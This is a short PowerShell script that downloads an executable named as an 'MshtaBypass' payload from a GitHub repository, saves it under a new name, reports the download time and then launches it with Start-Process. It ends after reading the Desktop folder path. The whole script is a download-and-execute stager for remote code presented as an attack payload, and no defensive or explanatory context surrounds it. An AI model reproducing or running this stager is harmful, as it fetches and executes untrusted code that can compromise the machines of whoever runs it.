$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/MshtaBypass/MshtaPs1OnlinePayload.exe'
$output = "MshtaPs1OnlinePayloadDownloaded.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "MshtaPs1OnlinePayloadDownloaded.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');